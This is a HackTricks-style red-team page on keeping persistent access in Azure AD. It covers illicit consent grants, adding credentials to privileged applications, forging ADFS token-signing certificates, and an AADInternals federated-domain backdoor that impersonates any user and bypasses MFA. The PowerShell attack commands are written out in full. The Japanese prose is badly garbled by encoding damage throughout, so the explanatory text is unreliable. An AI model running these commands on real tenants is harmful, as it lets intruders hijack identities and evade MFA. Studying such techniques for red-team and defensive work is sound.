# Az - Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Illicit Consent Grant

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒAzure ADã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç™»éŒ²ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€é«˜ã„å½±éŸ¿åŠ›ã®ã‚ã‚‹æ¨©é™ãŒå¿…è¦ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒ†ãƒŠãƒ³ãƒˆå°‚ç”¨ï¼‰ã‚’ç®¡ç†è€…ã®åŒæ„ã§ç™»éŒ²ã§ãã¾ã™ï¼ˆç®¡ç†è€…ã§ã‚ã‚Œã°æ‰¿èªã§ãã¾ã™ï¼‰ - ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä»£ç†ã§ãƒ¡ãƒ¼ãƒ«ã‚’é€ä¿¡ã—ãŸã‚Šã€å½¹å‰²ç®¡ç†ã‚’è¡Œã£ãŸã‚Šã™ã‚‹ã“ã¨ãªã©ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æˆåŠŸã—ãŸå ´åˆã«éå¸¸ã«**æœ‰ç›Š**ãª**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒ**ã‚’**å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€ã‚¢ã‚¯ã‚»ã‚¹ã‚’ç¶­æŒã™ã‚‹æ‰‹æ®µã¨ã—ã¦ã€ãã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è‡ªåˆ†ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦å—ã‘å…¥ã‚Œã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

### Applications and Service Principals

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ç®¡ç†è€…ã€GAã€ã¾ãŸã¯microsoft.directory/applications/credentials/updateæ¨©é™ã‚’æŒã¤ã‚«ã‚¹ã‚¿ãƒ ãƒ­ãƒ¼ãƒ«ã®ç‰¹æ¨©ã‚’æŒã¤å ´åˆã€æ—¢å­˜ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è³‡æ ¼æƒ…å ±ï¼ˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¾ãŸã¯è¨¼æ˜æ›¸ï¼‰ã‚’è¿½åŠ ã§ãã¾ã™ã€‚

**é«˜ã„æ¨©é™ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹**ã“ã¨ã‚‚ã€**é«˜ã„æ¨©é™ã‚’æŒã¤æ–°ã—ã„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è¿½åŠ ã™ã‚‹**ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è¿½åŠ ã™ã‚‹ã®ã«èˆˆå‘³æ·±ã„å½¹å‰²ã¯ã€**ç‰¹æ¨©èªè¨¼ç®¡ç†è€…ãƒ­ãƒ¼ãƒ«**ã§ã‚ã‚Šã€ã“ã‚Œã«ã‚ˆã‚Šã‚°ãƒ­ãƒ¼ãƒãƒ«ç®¡ç†è€…ã®**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒªã‚»ãƒƒãƒˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æŠ€è¡“ã¯ã¾ãŸã€**MFAã‚’ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* è¨¼æ˜æ›¸ãƒ™ãƒ¼ã‚¹ã®èªè¨¼ã®å ´åˆ

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federation - ãƒˆãƒ¼ã‚¯ãƒ³ç½²åè¨¼æ˜æ›¸

**DAæ¨©é™**ã‚’æŒã¤ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ADã§ã¯ã€éå¸¸ã«é•·ã„æœ‰åŠ¹æœŸé™ã‚’æŒã¤**æ–°ã—ã„ãƒˆãƒ¼ã‚¯ãƒ³ç½²å**ãŠã‚ˆã³**ãƒˆãƒ¼ã‚¯ãƒ³å¾©å·è¨¼æ˜æ›¸**ã‚’ä½œæˆãŠã‚ˆã³ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ç§ãŸã¡ã¯**ImmutableID**ã‚’çŸ¥ã£ã¦ã„ã‚‹ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦**ãƒ­ã‚°ã‚¤ãƒ³**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’** **ADFSã‚µãƒ¼ãƒãƒ¼ä¸Šã®DAã¨ã—ã¦å®Ÿè¡Œ**ã—ã¦ã€æ–°ã—ã„è¨¼æ˜æ›¸ã‚’ä½œæˆã—ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯'AADInternals'ï¼‰ã€ãã‚Œã‚‰ã‚’ADFSã«è¿½åŠ ã—ã€è‡ªå‹•ãƒ­ãƒ¼ãƒ«ã‚ªãƒ¼ãƒãƒ¼ã‚’ç„¡åŠ¹ã«ã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã—ã¾ã™ï¼š
```powershell
New-AADIntADFSSelfSignedCertificates
```
æ¬¡ã«ã€Azure ADã§è¨¼æ˜æ›¸æƒ…å ±ã‚’æ›´æ–°ã—ã¾ã™ï¼š
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

ãƒ†ãƒŠãƒ³ãƒˆã«GAæ¨©é™ãŒã‚ã‚‹å ´åˆã€**æ–°ã—ã„ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆç¢ºèªãŒå¿…è¦ã§ã™ï¼‰ã€ãã®èªè¨¼ã‚¿ã‚¤ãƒ—ã‚’Federatedã«è¨­å®šã—ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’**ç‰¹å®šã®è¨¼æ˜æ›¸**ï¼ˆä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã®any.stsï¼‰ãŠã‚ˆã³ç™ºè¡Œè€…ã‚’**ä¿¡é ¼**ã™ã‚‹ã‚ˆã†ã«è¨­å®šã—ã¾ã™ï¼š
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## å‚è€ƒæ–‡çŒ®

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
